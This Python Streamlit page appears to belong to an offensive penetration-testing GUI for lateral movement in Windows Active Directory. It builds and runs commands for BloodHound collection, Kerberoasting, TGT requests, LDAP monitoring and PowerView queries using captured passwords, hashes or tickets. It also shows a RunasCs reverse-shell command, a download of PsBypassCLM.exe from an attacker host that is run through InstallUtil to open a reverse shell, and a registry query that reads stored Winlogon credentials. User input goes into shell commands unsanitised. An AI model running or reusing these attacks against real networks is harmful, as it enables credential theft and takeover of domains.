import streamlit as st
import subprocess
from utils import *
import os

st.set_page_config(page_title="Lateral_Penetration")
init()
css='''
<style>
    section.main > div {max-width:70rem}
</style>
'''
st.markdown(css, unsafe_allow_html=True)
st.sidebar.markdown("**Current Target IP** :  "+st.session_state.ip)
st.sidebar.markdown("**Current Target Domian** :  "+st.session_state.domain)

if st.session_state.ip is not '':
    time_diff = get_date_diff(st.session_state.ip)
    pref_exec = "faketime -f " + time_diff +"h"
    if st.sidebar.button("GetTimeDifference"):
        if time_diff:
            st.sidebar.success("server time - local time = {}h".format(time_diff))
        else:
            st.warning("something wrong ..")

st.sidebar.markdown("**Credentials**")
init1_col1,init1_col2 = st.sidebar.columns(2)
with init1_col1:
    username  = st.text_input("username",st.session_state.username)
with init1_col2:
    password = st.text_input("password",st.session_state.password)
user_hash = st.sidebar.text_input('user_hash (format: LM\:NLTM)',st.session_state.user_hash)
ticket_file_path = st.sidebar.text_input("kerberos tickets path",st.session_state.ticket_file_path)
save_credentials = st.sidebar.button("save")
if save_credentials:
    st.session_state.username = username
    st.session_state.password = password
    st.session_state.user_hash = user_hash
    st.session_state.ticket_file_path = ticket_file_path
    st.sidebar.success("save successfully")

st.sidebar.markdown("# Lateral_penetration")
st.sidebar.markdown("With the correct redential of the user, gather other users credentials and search for the path to administor")
st.sidebar.markdown('''
    - Bloodhound
    - Kerberos 
    - GetTGT
    - Ldapmonitor
    - Powerview
    - LateralShell
    - PSByPassCLM
    - Pass From Reg
    ''')
st.session_state.show_command = st.sidebar.checkbox("Show command", True)







st.title("Bloodhound")
# on = st.toggle('neo4j start')
# if on:
#     result = subprocess.run(
#                 "sudo neo4j start", shell=True, text=True, capture_output=True
#             )
#     if "Started neo4j" in result.stdout:
#         st.success("started neo4j success")
with st.form('bloodhound-python'):
    col1, col2 = st.columns([2.5,1]) 
    with col1:
        option = st.selectbox(
           "choose credential",
           ("password", "user_hash"),
           index=None,
           placeholder="choose credential",
           label_visibility='collapsed'
        )
    with col2:
        bloodhound_python_button = st.form_submit_button("bloodhound-python")
    if bloodhound_python_button:
        if st.session_state.ip and st.session_state.domain:
            if option:
                folder_name  = create_folder("./winhack/bloodhound/")
                if option is "password":
                    command = "cd ./winhack/bloodhound/{}; {} bloodhound-python -u {} -p '{}' -ns {} -d {}  -c All".format(folder_name,pref_exec,username,password,st.session_state.ip,st.session_state.domain)
                elif option is "user_hash":
                    command = "cd ./winhack/bloodhound/{}; {} bloodhound-python -u {}  --hashes '{}' -ns {} -d {}  -c All".format(folder_name,pref_exec,username,user_hash,st.session_state.ip,st.session_state.domain)
                st.info(command)
                run_command(command )
                show_command(command)
                st.success("Json file of bloodhound is saved to ./winhack/bloodhound/{} !".format(folder_name))
            else:
                warning("select","")
        else:
            if not st.session_state.ip:
                warning("missing","ip")
            if not st.session_state.domain:
                warning("missing","domain")

with st.form('bloodhound'):
    # Create two columns; adjust the ratio to your liking
    col1, col2 = st.columns([3,1]) 
    # Use the first column for text input
    with col1:  
        bloodfile_path = st.text_input("path  for bloodhound json",placeholder="path  for bloodhound json",label_visibility='collapsed')
    # Use the second column for the submit button
    with col2:
        start_bloodhound = st.form_submit_button("run bloodhound")
    
    if start_bloodhound:
        if bloodfile_path :
            st.info("Starting bloodhound .....")
            result = subprocess.run(
                "cd {};bloodhound".format(bloodfile_path), shell=True, text=True, capture_output=True
            )
        else:
            warning("missing","bloodhound path")



st.title("Kerberos")
with st.form('Kerberos'):
    col1, col2 = st.columns([2.5,1])
    with col1:
        option = st.selectbox(
           "choose credential",
           ("password", "user_hash", "kerberos"),
           index=None,
           placeholder="choose credential",
           label_visibility='collapsed'
        )
    with col2:
        Kerberoast_attack_button = st.form_submit_button("Kerberoast attack")
    if Kerberoast_attack_button:
        if st.session_state.ip and username and st.session_state.domain and option:
            if option is "password":
                command = "{} GetUserSPNs.py -request -dc-ip {} {}/{}:{}".format(pref_exec,st.session_state.ip,st.session_state.domain,username, password)
            elif option is "user_hash":
                command = "{} GetUserSPNs.py -request -dc-ip {} -hashes {} -no-pass {}/{}".format(pref_exec,st.session_state.ip,user_hash,st.session_state.domain,username)
            else:
                command = "export KRB5CCNAME={};".format(ticket_file_path)
                command += "{} GetUserSPNs.py -request -dc-ip {} -k -no-pass  {}/{}".format(pref_exec,st.session_state.ip,st.session_state.domain,username)
            run_command(command )
            show_command(command)
        else:
            if not st.session_state.ip:
                warning("missing","ip")
            if not st.session_state.domain:
                warning("missing","domain")

st.title("GetTGT")
with st.form('GetTGT'):
    col1, col2 = st.columns([2.5,1])
    with col1:
        option = st.selectbox(
           "choose credential",
           ("password", "user_hash"),
           index=None,
           placeholder="choose credential",
           label_visibility='collapsed'
        )
    with col2:
        RequestTGT_button = st.form_submit_button("RequestTGT")
    if RequestTGT_button:
        if st.session_state.ip and username and st.session_state.domain and option:
            if option is "password":
                command = "cd ./winhack/tickets;{} getTGT.py {}/{}:'{}' -dc-ip {}".format(pref_exec,st.session_state.domain,username,password,st.session_state.ip)
            elif option is "user_hash":
                command = "cd ./winhack/tickets;{} getTGT.py {}/{} -hashes {} -dc-ip {}".format(pref_exec,st.session_state.domain,username,user_hash,st.session_state.ip)
            result = run_command(command )
            st.success("ccache file stored in ./winhack/tickets/{}".format(result.split(" ")[-1]))
            show_command(command)
        else:
            if not st.session_state.ip:
                warning("missing","ip")
            if not st.session_state.domain:
                warning("missing","domain")
            if not username:
                warning("missing","username")

st.title("Ldapmonitor")
with st.form('ldapmonitor'):
    col1, col2 = st.columns([2.5,1])
    with col1:
        option = st.selectbox(
           "choose credential",
           ("password", "user_hash", "kerberos"),
           index=None,
           placeholder="choose credential",
           label_visibility='collapsed'
        )
    with col2:
        ldap_monitor_button =  st.form_submit_button("monitor start")
    if ldap_monitor_button:
        if st.session_state.ip and username and st.session_state.domain and option:
            a = int(time.time())
            if option is "password":
                command = "{} pyLDAPmonitor.py -d {} -u {} -p '{}' --use-ldaps --dc-ip {} -l ./winhack/tickets/ldap_monitor &".format(pref_exec,st.session_state.domain,username,password,st.session_state.ip)
            elif option is "user_hash":
                command = "{} pyLDAPmonitor.py -d {} -u {} -H {} --use-ldaps --dc-ip {} -l ./winhack/tickets/ldap_monitor &".format(pref_exec,st.session_state.domain,user_hash,password,st.session_state.ip)
            else:
                command = "export KRB5CCNAME={};".format(ticket_file_path)
                command += "{} pyLDAPmonitor.py -u {} -d {}  -k --use-ldaps --dc-ip {} -l ./winhack/tickets/ldap_monitor_{} &".format(pref_exec,username,st.session_state.domain,st.session_state.ip,a)
            st.info(command)
            st.success("started ldap_monitor, please check out ./winhack/tickets/ldap_monitor_{}.1 later".format(a))
            run_command(command)
            show_command(command)
        else:
            if not st.session_state.ip:
                warning("missing","ip")
            if not st.session_state.domain:
                warning("missing","domain")
            if not username:
                warning("missing","username")

st.title("Powerview")
with st.form('Powerview'):
    query_string = st.text_input("query string od powerview",placeholder="query string od powerview",label_visibility='collapsed')
    st.info('''\n
        Get-ObjectAcl -Identity * -Where 'SecurityIdentifier contains username'\n
        Get-ObjectAcl -Identity username\n
        Add-DomainGroupMember -Identity 'localgroup' -Members 'username'
        ''')
    col1, col2 = st.columns([2.5,1])
    with col1:
        option = st.selectbox(
           "choose credential",
           ("user_hash", "kerberos"),
           index=None,
           placeholder="choose credential",
           label_visibility='collapsed'
        )
    with col2:
        powerview_button =  st.form_submit_button("Query")
    if powerview_button:
        if st.session_state.ip and username and st.session_state.domain and option:
            if option is "user_hash":
                command = "{} powerview.py {}/{}@{} -H {}  --dc-ip {} --use-ldaps -q \"{}\"".format(pref_exec,st.session_state.domain,username,st.session_state.ip,user_hash,st.session_state.ip,query_string)
            else:
                command = "export KRB5CCNAME={};".format(ticket_file_path)
                command += "{} powerview.py {}/{}@{} -k --no-pass --dc-ip {} --use-ldaps -q \"{}\"".format(pref_exec,st.session_state.domain,username,st.session_state.ip,st.session_state.ip,query_string)
            st.info("This might take a while ...")
            run_command(command)
            show_command(command)
        else:
            if not st.session_state.ip:
                warning("missing","ip")
            if not st.session_state.domain:
                warning("missing","domain") 

st.title("LateralShell")
st.info('''
    .\RunasCs.exe [user] [password] cmd.exe -r [reverse_ip\:reverse_port]
    ''')

st.title("PSByPassCLM")
st.info('''
    iwr -uri http://[ip]:[port]/PsBypassCLM.exe -outfile PsBypassCLM.exe :n
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=[reverse_ip] /rport=[reverse_port] PsBypassCLM.exe
    ''')

st.title("Pass From Reg")
st.info('''
    reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon"
    ''')